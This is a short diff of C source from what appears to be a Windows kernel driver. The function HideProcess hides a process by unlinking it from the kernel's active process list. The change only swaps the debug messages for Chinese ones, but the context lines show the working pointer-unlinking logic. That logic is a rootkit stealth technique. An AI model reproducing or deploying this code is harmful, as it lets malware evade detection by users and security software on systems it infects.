@@ -24,12 +24,13 @@ NTSTATUS HideProcess(ULONG ulPID) {
 			//*(ULONG*)((DWORD_PTR)pCurProcess + PIDOffset) += 123;
 			pNextLinks->Flink->Blink = pNextLinks->Blink;
 			pNextLinks->Blink->Flink = pNextLinks->Flink;
-			KdPrint(("Found and Delete Chain\n"));
+			/*KdPrint(("Found and Delete Chain\n"));*/
+			KdPrint(("隐藏进程成功\n"));
 			return STATUS_SUCCESS;
 		}
 		pNextLinks = pNextLinks->Flink;
 	}
-	KdPrint(("Pid Not Found\n"));
+	KdPrint(("隐藏进程失败：未找到进程\n"));
 	return STATUS_NOT_FOUND;
 }
 
